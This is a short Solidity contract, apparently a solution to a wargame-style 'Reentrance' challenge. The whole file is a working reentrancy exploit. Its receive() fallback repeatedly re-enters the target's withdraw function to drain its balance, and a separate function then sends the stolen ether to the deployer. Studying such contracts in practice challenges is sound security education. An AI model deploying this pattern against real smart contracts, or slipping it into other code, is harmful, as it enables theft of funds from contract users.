// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import "./Reentrance.sol";

contract Malicious {

    using SafeMath for uint256;

    Reentrance public reentrance;
    address private _owner;
    uint256 private _amount;

    constructor(address reentrance_) {
        reentrance = Reentrance(payable(reentrance_));
        _owner = msg.sender;
        _amount = 0.0001 ether;
    }

    function donateTo() public payable {
        reentrance.donate{value: msg.value}(address(this));
    }

    function attack() public {
        reentrance.withdraw(_amount);
    }

    function withdraw() public {
       (bool sent,) = _owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        if (address(reentrance).balance != 0) {
            reentrance.withdraw(_amount);
        }
    }
}